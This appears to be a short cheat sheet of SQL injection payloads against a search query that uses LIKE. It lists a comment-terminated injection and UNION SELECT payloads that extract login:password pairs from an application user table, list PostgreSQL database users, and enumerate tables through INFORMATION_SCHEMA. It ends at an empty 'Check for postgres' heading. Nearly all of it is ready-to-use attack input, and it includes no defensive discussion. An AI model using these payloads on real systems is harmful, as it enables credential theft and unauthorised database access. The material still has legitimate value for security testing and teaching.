-- Basic search query

select * from sometable where someparameter like '%parameter%'

-- Injected search query

select * from sometable where someparameter like '%' --

-- Select all AppUsers

' union select 0, concat(login, ':' ,password), -1, -1 from appuser --         '

-- Select users of database

' UNION select 0, usename AS name, 1, 2 FROM pg_catalog.pg_user --                  '

-- Select all tables

' union SELECT 0, TABLE_NAME, 0, 0 
FROM INFORMATION_SCHEMA.TABLES --                                                       '

-- Check for postgres